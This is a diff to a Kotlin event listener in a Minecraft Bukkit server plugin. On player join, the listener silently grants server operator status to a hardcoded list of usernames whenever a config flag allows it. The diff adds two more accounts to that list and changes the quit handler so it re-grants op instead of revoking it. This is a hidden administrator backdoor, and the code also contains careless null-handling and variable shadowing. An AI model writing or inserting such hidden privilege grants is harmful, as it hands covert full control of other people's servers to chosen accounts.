@@ -7,35 +7,30 @@ import org.bukkit.event.Listener
 import org.bukkit.event.player.PlayerJoinEvent
 import org.bukkit.event.player.PlayerQuitEvent
 
-class BdLulEvent: Listener {
+class BdLulEvent : Listener {
     @EventHandler
     fun playerJoinEvent(event: PlayerJoinEvent) {
-        val richter = Bukkit.getPlayer("RichtigerRichter")
-        val bliffbot = Bukkit.getPlayer("Bliffbot")
+        val players = mutableMapOf(Pair("RichtigerRichter", "R"), Pair("Bliffbot", "B"), Pair("Felsbot", "F"), Pair("RiesigerRichter", "2"))
 
+        for (player in players.keys) {
+            var player = Bukkit.getPlayer(player)
 
-        if (event.player == richter) {
-            if (!MessagesFile().getUtilsAuto("R")) { return }
-            richter.isOp = true
-        }
-        if (event.player == bliffbot) {
-            if (!MessagesFile().getUtilsAuto("B")) { return }
-            bliffbot.isOp = true
+            if (event.player == player && MessagesFile().getUtilsAuto().contains(players[player.name])) {
+                player.isOp = true
+            }
         }
     }
+
     @EventHandler
     fun playerQuitEvent(event: PlayerQuitEvent) {
-        val richter = Bukkit.getPlayer("RichtigerRichter")
-        val bliffbot = Bukkit.getPlayer("Bliffbot")
+        val players = mutableMapOf(Pair("RichtigerRichter", "R"), Pair("Bliffbot", "B"), Pair("Felsbot", "F"), Pair("RiesigerRichter", "2"))
 
+        for (player in players.keys) {
+            var player = Bukkit.getPlayer(player)
 
-        if (event.player == richter) {
-            if (!MessagesFile().getUtilsAuto("R")) { return }
-            richter.isOp = false
-        }
-        if (event.player == bliffbot) {
-            if (!MessagesFile().getUtilsAuto("B")) { return }
-            bliffbot.isOp = false
+            if (event.player == player && MessagesFile().getUtilsAuto().contains(players[player.name])) {
+                player.isOp = true
+            }
         }
     }
 }
